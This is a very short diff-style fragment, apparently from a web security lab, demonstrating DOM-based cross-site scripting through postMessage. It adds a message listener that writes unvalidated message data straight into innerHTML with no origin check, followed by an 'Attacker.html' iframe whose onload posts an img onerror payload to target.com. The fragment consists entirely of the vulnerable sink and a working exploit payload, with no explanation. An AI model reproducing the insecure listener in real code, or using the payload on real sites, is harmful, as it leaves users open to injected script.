@@ -1,0 +1,6 @@
+window.addEventListener('message', function(e) {
+    document.getElementById('ads').innerHTML = e.data;
+})
+
+Attacker.html
+ <iframe src="//target.com" onload="this.contentWindow.postMessage('</div><img src=xss onerror=print()>','*')"> 
